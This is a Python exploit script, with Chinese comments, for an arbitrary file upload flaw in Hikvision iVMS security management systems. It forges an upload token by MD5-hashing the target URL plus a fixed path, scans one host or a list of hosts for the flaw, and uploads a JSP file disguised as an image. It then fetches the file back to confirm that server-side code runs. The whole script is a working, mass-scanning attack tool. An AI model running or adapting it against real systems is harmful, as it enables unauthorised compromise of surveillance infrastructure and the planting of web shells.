import argparse
import hashlib
import urllib

import requests
import urllib3

parser = argparse.ArgumentParser(description='帮助信息')
parser.add_argument('-u', '--url', help="输入一个url", default='')
parser.add_argument('-f', '--file', help="输入一个文件", default='')
parser.add_argument('-up', '--upload', help="输入需要上传的url", default='')
args = parser.parse_args()
urllib3.disable_warnings()


## 对输入的URL进行md5 加密
def md5encode(url):
    # 判断结尾是不是/
    if url.endswith('/'):
        path = 'eps/api/resourceOperations/uploadsecretKeyIbuilding'
    else:
        path = '/eps/api/resourceOperations/uploadsecretKeyIbuilding'
    ## 对url 进行拼接
    encodetext = url + path
    ## 创建md5对象 md5
    path_md5 = hashlib.md5()
    # 对拼接 后的URL进行md5加密
    path_md5.update(encodetext.encode('utf-8'))
    return (path_md5.hexdigest()).upper()


## 创建检查函数
def check(url):
    # 判断结尾是不是/
    if url.endswith('/'):
        path = 'eps/api/resourceOperations/upload?token='
    else:
        path = '/eps/api/resourceOperations/upload?token='
    ## 拼接后的URL（带入利用的url）
    Splicing_URL = url + path + md5encode(url)

    # 定义请求头
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
    }

    ## 请求数据  quote（）方法能够将汉字转换成 unicode 编码的格式，适用于单个参数
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=Splicing_URL, headers=header, data=data, verify=False)
        if response.status_code == 200 and 'false' in response.text:
            print(f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
        else:
            print(f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
    except Exception as e:
        print("验证函数异常")


## 读取文件进行验证漏洞
def more(file):
    f = open(file, 'r')
    for i in f.readlines():
        i = i.strip()
        check(i)


## 文件上传
def exp(url):
    ## 判断输入的URL
    if url.endswith('/'):
        path = 'eps/api/resourceOperations/upload?token='
    else:
        path = '/eps/api/resourceOperations/upload?token='
    ## 拼接后的URL（带入利用的url）
    Splicing_URL = url + path + md5encode(url)
    # 定义请求头
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo"
    }
    ## 需要上传的内容
    shell = str("nb")
    data = '------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name="fileUploader";filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\n' + shell + '\r\n------WebKitFormBoundaryGEJwiloiPo'
    response = requests.post(url=Splicing_URL, headers=header, data=data, timeout=3)
    upload_path = \
        response.text.replace('\"', "").replace('{', "").replace('}', "").split('resourceUuid:')[1].split(
            ",resourceType")[
            0]
    ## 上传后url 地址
    shell_url = url + "/eps/upload/" + upload_path + ".jsp"
    response_data = requests.get(url=shell_url)
    ## 判断返回的参数和状态进行
    if "nb" in response_data.text and response_data.status_code == 200:
        print("文件上传成功,请访问 {} 进行查看!!!".format(shell_url))
    else:
        print('上传失败，请手动测试')


if __name__ == '__main__':
    if args.url != '' and args.file == '':
        check(args.url)
    if args.url == '' and args.file != '':
        more(args.file)
    if args.upload != '':
        exp(args.upload)
